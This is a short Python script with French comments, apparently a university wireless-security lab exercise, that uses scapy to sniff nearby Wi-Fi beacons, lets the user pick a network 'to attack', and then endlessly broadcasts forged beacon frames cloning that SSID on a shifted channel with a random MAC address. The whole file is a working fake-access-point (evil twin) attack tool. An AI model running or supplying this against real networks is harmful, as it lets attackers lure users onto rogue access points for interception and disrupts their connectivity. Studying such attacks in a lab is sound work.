# Python 3.7.6
#
# Auteurs: Adrien Barth, Lionel Burgbacher
# Date:    09.03.2020
# Source:  https://gist.github.com/securitytube/5291959
#          https://www.thepythoncode.com/article/create-fake-access-points-scapy
#
# Description:
# Le script permet de lister les SSID à promoimité et permet à l'utilisateur de choisir un de ces SSID pour créer 
# un autre AP (avec le même SSID) sur un autre canal.

import argparse
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap
from prettytable import PrettyTable

parser = argparse.ArgumentParser(description='Fake channel script')

#L'interface par défaut est wlan0mon
parser.add_argument("-i", "--interface", default="wlan0mon", help="Interface you want to attack")
args = parser.parse_args()

#Liste de SSID disponible à proxomité
ap_list = []
#Liste des adresses des SSID
addr = []

def packethandler(pkt):

    if pkt.haslayer(Dot11Beacon):
        #On vérifie si l'adresse n'est pas contenue dans la liste
        if pkt.addr2 not in addr:
            # On récupère ici le paquet pour avoir toutes les informations
            ap_list.append(pkt)
            addr.append(pkt.addr2)


print("In progress...")
# Permet d'analyser les paquets, le timeout est arbitraire
sniff(iface=args.interface, prn=packethandler, timeout=5)

# Permet un affichage simple des SSID disponibles
table = PrettyTable()
table.title = 'List SSID'
for index,ssid in enumerate(ap_list):
    table.field_names = ['Index', 'SSID', 'Channel', 'Signal']
    table.add_row([str(index), str(ssid.info.decode()), str(ssid[Dot11Beacon].network_stats().get("channel")), str(ssid.dBm_AntSignal) +' dBm'])

print(table)

# Permet à l'utilisateur de choisir un SSID à copier
target = int(input("\nChoose the index of the SSID you want to attack: "))

print("\nYou choose to attack : " + str(ap_list[target].info.decode()))

# On récupère le canal pour y appliquer un déclage (min:1 max:12)
channel = ap_list[target][Dot11Beacon].network_stats().get("channel")
new_channel = channel + 6 if channel <= 6 else channel - 6

# Une nouvelle adresse MAC aléatoire
sender_mac = RandMAC()
# Même nom pour le nouveau SSID
ssid = ap_list[target].info.decode()
# Trame 802.11
dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
beacon = Dot11Beacon(cap="ESS+privacy")
# On ajoute le SSID à la trame
essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
# On ajoute le canal à la trame
dsset = Dot11Elt(ID="DSset", info=chr(new_channel))
# On crée une trame wifi avec la nouvelle configuration
frame = RadioTap()/dot11/beacon/essid/dsset
# Envoie la trame chaque 100 millisecondes
sendp(frame, inter=0.1, iface=args.interface, loop=1)
